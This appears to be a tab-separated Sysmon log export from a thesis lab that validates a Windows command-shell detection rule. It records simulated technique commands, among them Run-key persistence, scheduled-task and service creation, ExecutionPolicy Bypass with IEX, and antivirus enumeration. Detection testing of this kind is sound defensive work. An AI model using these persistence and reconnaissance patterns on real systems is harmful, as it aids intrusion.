2026-06-24T12:50:31.999Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.696Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:18.149Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /query /tn "TFM-TEC-003" /v /fo list	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.343Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:18.149Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /query /tn "TFM-TEC-003" /v /fo list	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.343Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:54.291Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe qc "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.186Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe start "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:00.085Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:54.291Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe qc "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.186Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe start "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:00.085Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
